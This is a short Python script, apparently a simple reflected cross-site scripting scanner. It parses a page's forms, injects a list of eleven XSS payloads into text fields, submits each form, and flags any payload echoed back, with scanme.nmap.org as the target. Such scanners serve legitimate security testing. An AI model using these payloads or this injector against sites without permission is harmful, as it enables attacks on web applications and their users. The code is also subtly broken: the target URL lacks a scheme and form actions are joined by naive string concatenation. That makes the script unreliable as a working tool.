import requests
from bs4 import BeautifulSoup

def test_xss(url):
    payloads = [
        '<form action="javascript:alert(\'XSS\')"><input type="submit"></form>',
        '<script>alert("XSS")</script>',
        '"><script>alert("XSS")</script>',
        '"><img src=x onerror=alert("XSS")>',
        'javascript:alert("XSS")',
        '<body onload=alert("XSS")>',
        '"><svg/onload=alert("XSS")>',
        '<iframe src="javascript:alert(\'XSS\');">',
        '\'"--><script>alert("XSS")</script>',
        '<img src="x" onerror="alert(\'XSS\')">',
        '<input type="text" value="<script>alert(\'XSS\')</script>">',
        # you can add as much as you want 
        ]

    # Get forms
    response = requests.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    forms = soup.find_all('form')
    found_xss = False

    # A separate loop is started for each form.
    for form in forms:
        action = form.get('action')
        method = form.get('method', 'get').lower()

        # For each payload, testing is done by injecting it into form fields.
        for payload in payloads:
            data = {}
            # Find inputs in the form and fill them with test data
            for input_tag in form.find_all('input'):
                input_name = input_tag.get('name')
                input_type = input_tag.get('type', 'text')
                if input_type == 'text':
                    data[input_name] = payload
                elif input_type == 'hidden':
                    data[input_name] = input_tag.get('value', '')

            # Send request to form
            if method == 'post':
                response = requests.post(url + action, data=data)
            else:
                response = requests.get(url + action, params=data)

            # Check answer
            if payload in response.text:
                print(f'XSS found ({payload}): {url + action}')
                found_xss = True
                break  # No need to test other payloads for this form

    # If no XSS is found in any form, inform the user.
    if not found_xss:
        print(f'XSS not found: {url}')


# Test URL
test_url = 'scanme.nmap.org'

test_xss(test_url)